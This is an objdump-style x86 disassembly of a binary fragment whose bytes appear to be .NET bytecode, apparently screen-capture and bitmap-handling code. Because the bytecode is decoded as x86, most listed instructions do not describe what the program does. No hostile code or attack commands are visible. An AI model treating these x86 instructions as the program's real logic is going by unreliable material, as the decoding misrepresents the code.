  40455d:	12 0b                	adc    (%ebx),%cl
  40455f:	28 2d 00 00 0a 28    	sub    %ch,0x280a0000
  404565:	8b 00                	mov    (%eax),%eax
  404567:	00 0a                	add    %cl,(%edx)
  404569:	6f                   	outsl  %ds:(%esi),(%dx)
  40456a:	8c 00                	mov    %es,(%eax)
  40456c:	00 0a                	add    %cl,(%edx)
  40456e:	13 0b                	adc    (%ebx),%ecx
  404570:	12 0b                	adc    (%ebx),%cl
  404572:	28 2e                	sub    %ch,(%esi)
  404574:	00 00                	add    %al,(%eax)
  404576:	0a 16                	or     (%esi),%dl
  404578:	16                   	push   %ss
  404579:	28 8b 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ebx)
  40457f:	8c 00                	mov    %es,(%eax)
  404581:	00 0a                	add    %cl,(%edx)
  404583:	13 0b                	adc    (%ebx),%ecx
  404585:	12 0b                	adc    (%ebx),%cl
  404587:	28 8e 00 00 0a 20    	sub    %cl,0x200a0000(%esi)
  40458d:	20 00                	and    %al,(%eax)
  40458f:	cc                   	int3
  404590:	00 6f 8f             	add    %ch,-0x71(%edi)
  404593:	00 00                	add    %al,(%eax)
  404595:	0a 0b                	or     (%ebx),%cl
  404597:	07                   	pop    %es
  404598:	6f                   	outsl  %ds:(%esi),(%dx)
  404599:	1d 00 00 0a 07       	sbb    $0x70a0000,%eax
  40459e:	6f                   	outsl  %ds:(%esi),(%dx)
  40459f:	1e                   	push   %ds
  4045a0:	00 00                	add    %al,(%eax)
  4045a2:	0a 73 1f             	or     0x1f(%ebx),%dh
  4045a5:	00 00                	add    %al,(%eax)
  4045a7:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4045aa:	28 20                	sub    %ah,(%eax)
  4045ac:	00 00                	add    %al,(%eax)
  4045ae:	0a 0d 1b 8d 02 00    	or     0x28d1b,%cl
  4045b4:	00 1b                	add    %bl,(%ebx)
  4045b6:	25 16 1b 8d 4a       	and    $0x4a8d1b16,%eax
  4045bb:	00 00                	add    %al,(%eax)
  4045bd:	01 25 d0 23 00 00    	add    %esp,0x23d0
  4045c3:	04 28                	add    $0x28,%al
  4045c5:	64 00 00             	add    %al,%fs:(%eax)
  4045c8:	0a a2 25 17 1b 8d    	or     -0x72e4e8db(%edx),%ah
  4045ce:	4a                   	dec    %edx
  4045cf:	00 00                	add    %al,(%eax)
  4045d1:	01 25 d0 1f 00 00    	add    %esp,0x1fd0
  4045d7:	04 28                	add    $0x28,%al
  4045d9:	64 00 00             	add    %al,%fs:(%eax)
  4045dc:	0a a2 25 18 1b 8d    	or     -0x72e4e7db(%edx),%ah
  4045e2:	4a                   	dec    %edx
  4045e3:	00 00                	add    %al,(%eax)
  4045e5:	01 25 d0 22 00 00    	add    %esp,0x22d0
  4045eb:	04 28                	add    $0x28,%al
  4045ed:	64 00 00             	add    %al,%fs:(%eax)
  4045f0:	0a a2 25 19 1b 8d    	or     -0x72e4e6db(%edx),%ah
  4045f6:	4a                   	dec    %edx
  4045f7:	00 00                	add    %al,(%eax)
  4045f9:	01 25 19 22 00 00    	add    %esp,0x2219
  4045ff:	80 3f a0             	cmpb   $0xa0,(%edi)
  404602:	a2 25 1a 1b 8d       	mov    %al,0x8d1b1a25
  404607:	4a                   	dec    %edx
  404608:	00 00                	add    %al,(%eax)
  40460a:	01 25 1a 22 00 00    	add    %esp,0x221a
  404610:	80 3f a0             	cmpb   $0xa0,(%edi)
  404613:	a2 73 90 00 00       	mov    %al,0x9073
  404618:	0a 13                	or     (%ebx),%dl
  40461a:	04 73                	add    $0x73,%al
  40461c:	1b 00                	sbb    (%eax),%eax
  40461e:	00 0a                	add    %cl,(%edx)
  404620:	13 05 11 05 11 04    	adc    0x4110511,%eax
  404626:	6f                   	outsl  %ds:(%esi),(%dx)
  404627:	91                   	xchg   %eax,%ecx
  404628:	00 00                	add    %al,(%eax)
  40462a:	0a 09                	or     (%ecx),%cl
  40462c:	07                   	pop    %es
  40462d:	16                   	push   %ss
  40462e:	16                   	push   %ss
  40462f:	07                   	pop    %es
  404630:	6f                   	outsl  %ds:(%esi),(%dx)
  404631:	1d 00 00 0a 07       	sbb    $0x70a0000,%eax
  404636:	6f                   	outsl  %ds:(%esi),(%dx)
  404637:	1e                   	push   %ds
  404638:	00 00                	add    %al,(%eax)
  40463a:	0a 73 22             	or     0x22(%ebx),%dh
  40463d:	00 00                	add    %al,(%eax)
  40463f:	0a 16                	or     (%esi),%dl
  404641:	16                   	push   %ss
  404642:	07                   	pop    %es
  404643:	6f                   	outsl  %ds:(%esi),(%dx)
  404644:	1d 00 00 0a 07       	sbb    $0x70a0000,%eax
  404649:	6f                   	outsl  %ds:(%esi),(%dx)
  40464a:	1e                   	push   %ds
  40464b:	00 00                	add    %al,(%eax)
  40464d:	0a 18                	or     (%eax),%bl
  40464f:	11 05 6f 23 00 00    	adc    %eax,0x236f
  404655:	0a 11                	or     (%ecx),%dl
  404657:	05 6f 92 00 00       	add    $0x926f,%eax
  40465c:	0a 08                	or     (%eax),%cl
  40465e:	13 06                	adc    (%esi),%eax
  404660:	11 06                	adc    %eax,(%esi)
  404662:	16                   	push   %ss
  404663:	16                   	push   %ss
  404664:	11 06                	adc    %eax,(%esi)
  404666:	6f                   	outsl  %ds:(%esi),(%dx)
  404667:	1d 00 00 0a 11       	sbb    $0x110a0000,%eax
  40466c:	06                   	push   %es
  40466d:	6f                   	outsl  %ds:(%esi),(%dx)
  40466e:	1e                   	push   %ds
  40466f:	00 00                	add    %al,(%eax)
  404671:	0a 73 22             	or     0x22(%ebx),%dh
  404674:	00 00                	add    %al,(%eax)
  404676:	0a 19                	or     (%ecx),%bl
  404678:	20 08                	and    %cl,(%eax)
  40467a:	18 02                	sbb    %al,(%edx)
  40467c:	00 6f 33             	add    %ch,0x33(%edi)
  40467f:	00 00                	add    %al,(%eax)
  404681:	0a 13                	or     (%ebx),%dl
  404683:	07                   	pop    %es
  404684:	11 07                	adc    %eax,(%edi)
  404686:	6f                   	outsl  %ds:(%esi),(%dx)
  404687:	36 00 00             	add    %al,%ss:(%eax)
  40468a:	0a 11                	or     (%ecx),%dl
  40468c:	07                   	pop    %es
  40468d:	6f                   	outsl  %ds:(%esi),(%dx)
  40468e:	34 00                	xor    $0x0,%al
  404690:	00 0a                	add    %cl,(%edx)
  404692:	28 4f 00             	sub    %cl,0x0(%edi)
  404695:	00 0a                	add    %cl,(%edx)
  404697:	13 08                	adc    (%eax),%ecx
  404699:	11 06                	adc    %eax,(%esi)
  40469b:	6f                   	outsl  %ds:(%esi),(%dx)
  40469c:	1d 00 00 0a 19       	sbb    $0x190a0000,%eax
  4046a1:	5a                   	pop    %edx
  4046a2:	59                   	pop    %ecx
  4046a3:	13 09                	adc    (%ecx),%ecx
  4046a5:	11 06                	adc    %eax,(%esi)
  4046a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4046a8:	1d 00 00 0a 19       	sbb    $0x190a0000,%eax
  4046ad:	5a                   	pop    %edx
  4046ae:	13 0a                	adc    (%edx),%ecx
  4046b0:	16                   	push   %ss
  4046b1:	13 0c 2b             	adc    (%ebx,%ebp,1),%ecx
  4046b4:	31 16                	xor    %edx,(%esi)
  4046b6:	13 0d 2b 19 11 08    	adc    0x811192b,%ecx
  4046bc:	20 ff                	and    %bh,%bh
  4046be:	00 00                	add    %al,(%eax)
  4046c0:	00 11                	add    %dl,(%ecx)
  4046c2:	08 47 59             	or     %al,0x59(%edi)
  4046c5:	d2 52 11             	rclb   %cl,0x11(%edx)
  4046c8:	08 17                	or     %dl,(%edi)
  4046ca:	58                   	pop    %eax
  4046cb:	13 08                	adc    (%eax),%ecx
  4046cd:	11 0d 17 58 13 0d    	adc    %ecx,0xd135817
  4046d3:	11 0d 11 0a 32 e1    	adc    %ecx,0xe1320a11
  4046d9:	11 08                	adc    %ecx,(%eax)
  4046db:	11 09                	adc    %ecx,(%ecx)
  4046dd:	58                   	pop    %eax
  4046de:	13 08                	adc    (%eax),%ecx
  4046e0:	11 0c 17             	adc    %ecx,(%edi,%edx,1)
  4046e3:	58                   	pop    %eax
  4046e4:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4046e7:	0c 11                	or     $0x11,%al
  4046e9:	06                   	push   %es
  4046ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4046eb:	1e                   	push   %ds
  4046ec:	00 00                	add    %al,(%eax)
  4046ee:	0a 32                	or     (%edx),%dh
  4046f0:	c4 11                	les    (%ecx),%edx
  4046f2:	06                   	push   %es
  4046f3:	11 07                	adc    %eax,(%edi)
  4046f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046f6:	3a 00                	cmp    (%eax),%al
  4046f8:	00 0a                	add    %cl,(%edx)
  4046fa:	06                   	push   %es
  4046fb:	11 06                	adc    %eax,(%esi)
  4046fd:	02 7b 25             	add    0x25(%ebx),%bh
  404700:	00 00                	add    %al,(%eax)
  404702:	04 1f                	add    $0x1f,%al
  404704:	f6 1f                	negb   (%edi)
  404706:	0b 6f 70             	or     0x70(%edi),%ebp
  404709:	00 00                	add    %al,(%eax)
  40470b:	0a 02                	or     (%edx),%al
  40470d:	7b 25                	jnp    0x404734
  40470f:	00 00                	add    %al,(%eax)
  404711:	04 1f                	add    $0x1f,%al
  404713:	f6 1f                	negb   (%edi)
  404715:	0b 6f 70             	or     0x70(%edi),%ebp
  404718:	00 00                	add    %al,(%eax)
  40471a:	0a 02                	or     (%edx),%al
  40471c:	7b 26                	jnp    0x404744
  40471e:	00 00                	add    %al,(%eax)
  404720:	04 02                	add    $0x2,%al
  404722:	7b 27                	jnp    0x40474b
  404724:	00 00                	add    %al,(%eax)
  404726:	04 6f                	add    $0x6f,%al
  404728:	93                   	xchg   %eax,%ebx
  404729:	00 00                	add    %al,(%eax)
  40472b:	0a de                	or     %dh,%bl
  40472d:	03 26                	add    (%esi),%esp
  40472f:	de 00                	fiadds (%eax)
  404731:	2a 00                	sub    (%eax),%al
  404733:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  40473e:	00 00                	add    %al,(%eax)
  404740:	1a 02                	sbb    (%edx),%al
  404742:	00 00                	add    %al,(%eax)
  404744:	1a 02                	sbb    (%edx),%al
  404746:	00 00                	add    %al,(%eax)
  404748:	03 00                	add    (%eax),%eax
  40474a:	00 00                	add    %al,(%eax)
  40474c:	14 00                	adc    $0x0,%al
  40474e:	00 01                	add    %al,(%ecx)
  404750:	1e                   	push   %ds
  404751:	02 28                	add    (%eax),%ch
  404753:	63 00                	arpl   %eax,(%eax)
  404755:	00 06                	add    %al,(%esi)
  404757:	2a 13                	sub    (%ebx),%dl
  404759:	30 02                	xor    %al,(%edx)
  40475b:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40475f:	00 12                	add    %dl,(%edx)
  404761:	00 00                	add    %al,(%eax)
  404763:	11 02                	adc    %eax,(%edx)
  404765:	7b 24                	jnp    0x40478b
  404767:	00 00                	add    %al,(%eax)
  404769:	04 2d                	add    $0x2d,%al
  40476b:	3b 7e 67             	cmp    0x67(%esi),%edi
  40476e:	00 00                	add    %al,(%eax)
  404770:	0a 28                	or     (%eax),%ch
  404772:	21 00                	and    %eax,(%eax)
  404774:	00 06                	add    %al,(%esi)
  404776:	0a 02                	or     (%edx),%al
  404778:	06                   	push   %es
  404779:	6f                   	outsl  %ds:(%esi),(%dx)
  40477a:	60                   	pusha
  40477b:	00 00                	add    %al,(%eax)
  40477d:	06                   	push   %es
  40477e:	7e 67                	jle    0x4047e7
  404780:	00 00                	add    %al,(%eax)
  404782:	0a 06                	or     (%esi),%al
  404784:	28 22                	sub    %ah,(%edx)
  404786:	00 00                	add    %al,(%eax)
  404788:	06                   	push   %es
  404789:	26 02 17             	add    %es:(%edi),%dl
  40478c:	7d 24                	jge    0x4047b2
  40478e:	00 00                	add    %al,(%eax)
  404790:	04 02                	add    $0x2,%al
  404792:	fe 06                	incb   (%esi)
  404794:	5e                   	pop    %esi
  404795:	00 00                	add    %al,(%eax)
  404797:	06                   	push   %es
  404798:	73 72                	jae    0x40480c
  40479a:	00 00                	add    %al,(%eax)
  40479c:	0a 73 73             	or     0x73(%ebx),%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	0a 28                	or     (%eax),%ch
  4047a3:	74 00                	je     0x4047a5
  4047a5:	00 0a                	add    %cl,(%edx)
  4047a7:	2a 13                	sub    (%ebx),%dl
  4047a9:	30 02                	xor    %al,(%edx)
  4047ab:	00 26                	add    %ah,(%esi)
  4047ad:	00 00                	add    %al,(%eax)
  4047af:	00 12                	add    %dl,(%edx)
  4047b1:	00 00                	add    %al,(%eax)
  4047b3:	11 7e 67             	adc    %edi,0x67(%esi)
  4047b6:	00 00                	add    %al,(%eax)
  4047b8:	0a 28                	or     (%eax),%ch
  4047ba:	21 00                	and    %eax,(%eax)
  4047bc:	00 06                	add    %al,(%esi)
  4047be:	0a 02                	or     (%edx),%al
  4047c0:	06                   	push   %es
  4047c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4047c2:	62 00                	bound  %eax,(%eax)
  4047c4:	00 06                	add    %al,(%esi)
  4047c6:	7e 67                	jle    0x40482f
  4047c8:	00 00                	add    %al,(%eax)
  4047ca:	0a 06                	or     (%esi),%al
  4047cc:	28 22                	sub    %ah,(%edx)
  4047ce:	00 00                	add    %al,(%eax)
  4047d0:	06                   	push   %es
  4047d1:	26 02 16             	add    %es:(%esi),%dl
  4047d4:	7d 24                	jge    0x4047fa
  4047d6:	00 00                	add    %al,(%eax)
  4047d8:	04 2a                	add    $0x2a,%al
  4047da:	00 00                	add    %al,(%eax)
  4047dc:	13 30                	adc    (%eax),%esi
  4047de:	02 00                	add    (%eax),%al
  4047e0:	59                   	pop    %ecx
  4047e1:	00 00                	add    %al,(%eax)
  4047e3:	00 13                	add    %dl,(%ebx)
  4047e5:	00 00                	add    %al,(%eax)
  4047e7:	11 2b                	adc    %ebp,(%ebx)
  4047e9:	4e                   	dec    %esi
  4047ea:	02 28                	add    (%eax),%ch
  4047ec:	8b 00                	mov    (%eax),%eax
  4047ee:	00 0a                	add    %cl,(%edx)
  4047f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4047f1:	8c 00                	mov    %es,(%eax)
  4047f3:	00 0a                	add    %cl,(%edx)
  4047f5:	0b 12                	or     (%edx),%edx
  4047f7:	01 28                	add    %ebp,(%eax)
  4047f9:	2b 00                	sub    (%eax),%eax
  4047fb:	00 0a                	add    %cl,(%edx)
  4047fd:	7d 26                	jge    0x404825
  4047ff:	00 00                	add    %al,(%eax)
  404801:	04 02                	add    $0x2,%al
  404803:	28 8b 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ebx)
  404809:	8c 00                	mov    %es,(%eax)
  40480b:	00 0a                	add    %cl,(%edx)
  40480d:	0b 12                	or     (%edx),%edx
  40480f:	01 28                	add    %ebp,(%eax)
  404811:	2c 00                	sub    $0x0,%al
  404813:	00 0a                	add    %cl,(%edx)
  404815:	7d 27                	jge    0x40483e
  404817:	00 00                	add    %al,(%eax)
  404819:	04 7e                	add    $0x7e,%al
  40481b:	67 00 00             	add    %al,(%bx,%si)
  40481e:	0a 28                	or     (%eax),%ch
  404820:	21 00                	and    %eax,(%eax)
  404822:	00 06                	add    %al,(%esi)
  404824:	0a 02                	or     (%edx),%al
  404826:	06                   	push   %es
  404827:	6f                   	outsl  %ds:(%esi),(%dx)
  404828:	61                   	popa
  404829:	00 00                	add    %al,(%eax)
  40482b:	06                   	push   %es
  40482c:	7e 67                	jle    0x404895
  40482e:	00 00                	add    %al,(%eax)
  404830:	0a 06                	or     (%esi),%al
  404832:	28 22                	sub    %ah,(%edx)
  404834:	00 00                	add    %al,(%eax)
  404836:	06                   	push   %es
  404837:	26 02 7b 24          	add    %es:0x24(%ebx),%bh
  40483b:	00 00                	add    %al,(%eax)
  40483d:	04 2d                	add    $0x2d,%al
  40483f:	aa                   	stos   %al,%es:(%edi)
  404840:	2a 6e 7e             	sub    0x7e(%esi),%ch
  404843:	67 00 00             	add    %al,(%bx,%si)
  404846:	0a 7e 67             	or     0x67(%esi),%bh
  404849:	00 00                	add    %al,(%eax)
  40484b:	0a 7e 67             	or     0x67(%esi),%bh
  40484e:	00 00                	add    %al,(%eax)
  404850:	0a 20                	or     (%eax),%ah
  404852:	85 00                	test   %eax,(%eax)
  404854:	00 00                	add    %al,(%eax)
  404856:	28 25 00 00 06 26    	sub    %ah,0x26060000
  40485c:	2a 00                	sub    (%eax),%al
  40485e:	00 00                	add    %al,(%eax)
  404860:	13 30                	adc    (%eax),%esi
  404862:	02 00                	add    (%eax),%al
  404864:	42                   	inc    %edx
  404865:	00 00                	add    %al,(%eax)
  404867:	00 14 00             	add    %dl,(%eax,%eax,1)
  40486a:	00 11                	add    %dl,(%ecx)
  40486c:	02 73 53             	add    0x53(%ebx),%dh
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 7d 25             	or     0x25(%ebp),%bh
  404874:	00 00                	add    %al,(%eax)
  404876:	04 02                	add    $0x2,%al
  404878:	28 8b 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ebx)
  40487e:	8c 00                	mov    %es,(%eax)
  404880:	00 0a                	add    %cl,(%edx)
  404882:	0a 12                	or     (%edx),%dl
  404884:	00 28                	add    %ch,(%eax)
  404886:	2b 00                	sub    (%eax),%eax
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	7d 26                	jge    0x4048b2
  40488c:	00 00                	add    %al,(%eax)
  40488e:	04 02                	add    $0x2,%al
  404890:	28 8b 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ebx)
  404896:	8c 00                	mov    %es,(%eax)
  404898:	00 0a                	add    %cl,(%edx)
  40489a:	0a 12                	or     (%edx),%dl
  40489c:	00 28                	add    %ch,(%eax)
  40489e:	2c 00                	sub    $0x0,%al
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	7d 27                	jge    0x4048cb
  4048a4:	00 00                	add    %al,(%eax)
  4048a6:	04 02                	add    $0x2,%al
  4048a8:	28 83 00 00 0a 2a    	sub    %al,0x2a0a0000(%ebx)
  4048ae:	1e                   	push   %ds
  4048af:	02 7b 28             	add    0x28(%ebx),%bh
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	04 2a                	add    $0x2a,%al
  4048b6:	22 02                	and    (%edx),%al
  4048b8:	03 7d 28             	add    0x28(%ebp),%edi
  4048bb:	00 00                	add    %al,(%eax)
  4048bd:	04 2a                	add    $0x2a,%al
  4048bf:	1e                   	push   %ds
  4048c0:	02 7b 29             	add    0x29(%ebx),%bh
  4048c3:	00 00                	add    %al,(%eax)
  4048c5:	04 2a                	add    $0x2a,%al
  4048c7:	22 02                	and    (%edx),%al
  4048c9:	03 7d 29             	add    0x29(%ebp),%edi
  4048cc:	00 00                	add    %al,(%eax)
  4048ce:	04 2a                	add    $0x2a,%al
  4048d0:	1e                   	push   %ds
  4048d1:	02 7b 2a             	add    0x2a(%ebx),%bh
  4048d4:	00 00                	add    %al,(%eax)
  4048d6:	04 2a                	add    $0x2a,%al
  4048d8:	22 02                	and    (%edx),%al
  4048da:	03 7d 2a             	add    0x2a(%ebp),%edi
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	04 2a                	add    $0x2a,%al
  4048e1:	5a                   	pop    %edx
  4048e2:	02 03                	add    (%ebx),%al
  4048e4:	7d 28                	jge    0x40490e
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	04 02                	add    $0x2,%al
  4048ea:	04 7d                	add    $0x7d,%al
  4048ec:	29 00                	sub    %eax,(%eax)
  4048ee:	00 04 02             	add    %al,(%edx,%eax,1)
  4048f1:	05 7d 2a 00 00       	add    $0x2a7d,%eax
  4048f6:	04 2a                	add    $0x2a,%al
  4048f8:	c2 02 28             	ret    $0x2802
  4048fb:	64 00 00             	add    %al,%fs:(%eax)
  4048fe:	06                   	push   %es
  4048ff:	0f 01                	(bad)
  404901:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  404905:	06                   	push   %es
  404906:	33 1f                	xor    (%edi),%ebx
  404908:	02 28                	add    (%eax),%ch
  40490a:	66 00 00             	data16 add %al,(%eax)
  40490d:	06                   	push   %es
  40490e:	0f 01                	(bad)
  404910:	28 66 00             	sub    %ah,0x0(%esi)
  404913:	00 06                	add    %al,(%esi)
  404915:	33 10                	xor    (%eax),%edx
  404917:	02 28                	add    (%eax),%ch
  404919:	68 00 00 06 0f       	push   $0xf060000
  40491e:	01 28                	add    %ebp,(%eax)
  404920:	68 00 00 06 fe       	push   $0xfe060000
  404925:	01 2a                	add    %ebp,(%edx)
  404927:	16                   	push   %ss
  404928:	2a 1e                	sub    (%esi),%bl
  40492a:	02 7b 2b             	add    0x2b(%ebx),%bh
  40492d:	00 00                	add    %al,(%eax)
  40492f:	04 2a                	add    $0x2a,%al
  404931:	22 02                	and    (%edx),%al
  404933:	03 7d 2b             	add    0x2b(%ebp),%edi
  404936:	00 00                	add    %al,(%eax)
  404938:	04 2a                	add    $0x2a,%al
  40493a:	1e                   	push   %ds
  40493b:	02 7b 2c             	add    0x2c(%ebx),%bh
  40493e:	00 00                	add    %al,(%eax)
  404940:	04 2a                	add    $0x2a,%al
  404942:	22 02                	and    (%edx),%al
  404944:	03 7d 2c             	add    0x2c(%ebp),%edi
  404947:	00 00                	add    %al,(%eax)
  404949:	04 2a                	add    $0x2a,%al
  40494b:	1e                   	push   %ds
  40494c:	02 7b 2d             	add    0x2d(%ebx),%bh
  40494f:	00 00                	add    %al,(%eax)
  404951:	04 2a                	add    $0x2a,%al
  404953:	22 02                	and    (%edx),%al
  404955:	03 7d 2d             	add    0x2d(%ebp),%edi
  404958:	00 00                	add    %al,(%eax)
  40495a:	04 2a                	add    $0x2a,%al
  40495c:	5a                   	pop    %edx
  40495d:	02 03                	add    (%ebx),%al
  40495f:	7d 2b                	jge    0x40498c
  404961:	00 00                	add    %al,(%eax)
  404963:	04 02                	add    $0x2,%al
  404965:	04 7d                	add    $0x7d,%al
  404967:	2c 00                	sub    $0x0,%al
  404969:	00 04 02             	add    %al,(%edx,%eax,1)
  40496c:	05 7d 2d 00 00       	add    $0x2d7d,%eax
  404971:	04 2a                	add    $0x2a,%al
  404973:	c2 02 28             	ret    $0x2802
  404976:	6c                   	insb   (%dx),%es:(%edi)
  404977:	00 00                	add    %al,(%eax)
  404979:	06                   	push   %es
  40497a:	0f 01                	(bad)
  40497c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404980:	06                   	push   %es
  404981:	33 1f                	xor    (%edi),%ebx
  404983:	02 28                	add    (%eax),%ch
  404985:	6e                   	outsb  %ds:(%esi),(%dx)
  404986:	00 00                	add    %al,(%eax)
  404988:	06                   	push   %es
  404989:	0f 01                	(bad)
  40498b:	28 6e 00             	sub    %ch,0x0(%esi)
  40498e:	00 06                	add    %al,(%esi)
  404990:	33 10                	xor    (%eax),%edx
  404992:	02 28                	add    (%eax),%ch
  404994:	70 00                	jo     0x404996
  404996:	00 06                	add    %al,(%esi)
  404998:	0f 01                	(bad)
  40499a:	28 70 00             	sub    %dh,0x0(%eax)
  40499d:	00 06                	add    %al,(%esi)
  40499f:	fe 01                	incb   (%ecx)
  4049a1:	2a 16                	sub    (%esi),%dl
  4049a3:	2a 1a                	sub    (%edx),%bl
  4049a5:	73 94                	jae    0x40493b
  4049a7:	00 00                	add    %al,(%eax)
  4049a9:	0a 7a 00             	or     0x0(%edx),%bh
  4049ac:	13 30                	adc    (%eax),%esi
  4049ae:	02 00                	add    (%eax),%al
  4049b0:	28 00                	sub    %al,(%eax)
  4049b2:	00 00                	add    %al,(%eax)
  4049b4:	15 00 00 11 16       	adc    $0x16110000,%eax
  4049b9:	0a 2b                	or     (%ebx),%ch
  4049bb:	0a 02                	or     (%edx),%al
  4049bd:	28 5f 00             	sub    %bl,0x0(%edi)
  4049c0:	00 06                	add    %al,(%esi)
  4049c2:	06                   	push   %es
  4049c3:	17                   	pop    %ss
  4049c4:	58                   	pop    %eax
  4049c5:	0a 06                	or     (%esi),%al
  4049c7:	19 32                	sbb    %esi,(%edx)
  4049c9:	f2 02 7b 25          	repnz add 0x25(%ebx),%bh
  4049cd:	00 00                	add    %al,(%eax)
  4049cf:	04 20                	add    $0x20,%al
  4049d1:	c4 09                	les    (%ecx),%ecx
  4049d3:	00 00                	add    %al,(%eax)
  4049d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4049d6:	41                   	inc    %ecx
  4049d7:	00 00                	add    %al,(%eax)
  4049d9:	0a 28                	or     (%eax),%ch
  4049db:	71 00                	jno    0x4049dd
  4049dd:	00 0a                	add    %cl,(%edx)
  4049df:	2a 1b                	sub    (%ebx),%bl
  4049e1:	30 0b                	xor    %cl,(%ebx)
  4049e3:	00 9e 1c 00 00 16    	add    %bl,0x1600001c(%esi)
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	11 16                	adc    %edx,(%esi)
  4049ed:	0a 12                	or     (%edx),%dl
  4049ef:	01 fe                	add    %edi,%esi
  4049f1:	15 11 00 00 02       	adc    $0x2000011,%eax
  4049f6:	12 01                	adc    (%ecx),%al
  4049f8:	16                   	push   %ss
  4049f9:	7d 57                	jge    0x404a52
  4049fb:	00 00                	add    %al,(%eax)
  4049fd:	04 12                	add    $0x12,%al
  4049ff:	01 16                	add    %edx,(%esi)
  404a01:	7d 58                	jge    0x404a5b
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 12                	add    $0x12,%al
  404a07:	01 02                	add    %eax,(%edx)
  404a09:	7b 25                	jnp    0x404a30
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	04 20                	add    $0x20,%al
  404a0f:	ff 00                	incl   (%eax)
  404a11:	00 00                	add    %al,(%eax)
  404a13:	6f                   	outsl  %ds:(%esi),(%dx)
  404a14:	41                   	inc    %ecx
  404a15:	00 00                	add    %al,(%eax)
  404a17:	0a d2                	or     %dl,%dl
  404a19:	7d 59                	jge    0x404a74
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	04 12                	add    $0x12,%al
  404a1f:	01 16                	add    %edx,(%esi)
  404a21:	7d 5a                	jge    0x404a7d
  404a23:	00 00                	add    %al,(%eax)
  404a25:	04 28                	add    $0x28,%al
  404a27:	95                   	xchg   %eax,%ebp
  404a28:	00 00                	add    %al,(%eax)
  404a2a:	0a 13                	or     (%ebx),%dl
  404a2c:	04 12                	add    $0x12,%al
  404a2e:	04 28                	add    $0x28,%al
  404a30:	96                   	xchg   %eax,%esi
  404a31:	00 00                	add    %al,(%eax)
  404a33:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  404a36:	95                   	xchg   %eax,%ebp
  404a37:	00 00                	add    %al,(%eax)
  404a39:	0a 13                	or     (%ebx),%dl
  404a3b:	04 12                	add    $0x12,%al
  404a3d:	04 28                	add    $0x28,%al
  404a3f:	97                   	xchg   %eax,%edi
  404a40:	00 00                	add    %al,(%eax)
  404a42:	0a 0d 03 28 27 00    	or     0x272803,%cl
  404a48:	00 06                	add    %al,(%esi)
  404a4a:	13 05 03 02 7b 26    	adc    0x267b0203,%eax
  404a50:	00 00                	add    %al,(%eax)
  404a52:	04 02                	add    $0x2,%al
  404a54:	7b 27                	jnp    0x404a7d
  404a56:	00 00                	add    %al,(%eax)
  404a58:	04 28                	add    $0x28,%al
  404a5a:	28 00                	sub    %al,(%eax)
  404a5c:	00 06                	add    %al,(%esi)
  404a5e:	13 06                	adc    (%esi),%eax
  404a60:	11 05 11 06 28 1e    	adc    %eax,0x1e280611
  404a66:	00 00                	add    %al,(%eax)
  404a68:	06                   	push   %es
  404a69:	26 11 05 16 16 02 7b 	adc    %eax,%es:0x7b021616
  404a70:	26 00 00             	add    %al,%es:(%eax)
  404a73:	04 02                	add    $0x2,%al
  404a75:	7b 27                	jnp    0x404a9e
  404a77:	00 00                	add    %al,(%eax)
  404a79:	04 03                	add    $0x3,%al
  404a7b:	16                   	push   %ss
  404a7c:	16                   	push   %ss
  404a7d:	20 20                	and    %ah,(%eax)
  404a7f:	00 cc                	add    %cl,%ah
  404a81:	00 28                	add    %ch,(%eax)
  404a83:	23 00                	and    (%eax),%eax
  404a85:	00 06                	add    %al,(%esi)
  404a87:	26 11 05 28 8a 00 00 	adc    %eax,%es:0x8a28
  404a8e:	0a 13                	or     (%ebx),%dl
  404a90:	07                   	pop    %es
  404a91:	28 8b 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ebx)
  404a97:	8c 00                	mov    %es,(%eax)
  404a99:	00 0a                	add    %cl,(%edx)
  404a9b:	13 09                	adc    (%ecx),%ecx
  404a9d:	12 09                	adc    (%ecx),%cl
  404a9f:	28 2b                	sub    %ch,(%ebx)
  404aa1:	00 00                	add    %al,(%eax)
  404aa3:	0a 28                	or     (%eax),%ch
  404aa5:	8b 00                	mov    (%eax),%eax
  404aa7:	00 0a                	add    %cl,(%edx)
  404aa9:	6f                   	outsl  %ds:(%esi),(%dx)
  404aaa:	8c 00                	mov    %es,(%eax)
  404aac:	00 0a                	add    %cl,(%edx)
  404aae:	13 09                	adc    (%ecx),%ecx
  404ab0:	12 09                	adc    (%ecx),%cl
  404ab2:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404ab5:	00 0a                	add    %cl,(%edx)
  404ab7:	20 0a                	and    %cl,(%edx)
  404ab9:	20 26                	and    %ah,(%esi)
  404abb:	00 73 8d             	add    %dh,-0x73(%ebx)
  404abe:	00 00                	add    %al,(%eax)
  404ac0:	0a 13                	or     (%ebx),%dl
  404ac2:	08 11                	or     %dl,(%ecx)
  404ac4:	08 28                	or     %ch,(%eax)
  404ac6:	20 00                	and    %al,(%eax)
  404ac8:	00 0a                	add    %cl,(%edx)
  404aca:	11 06                	adc    %eax,(%esi)
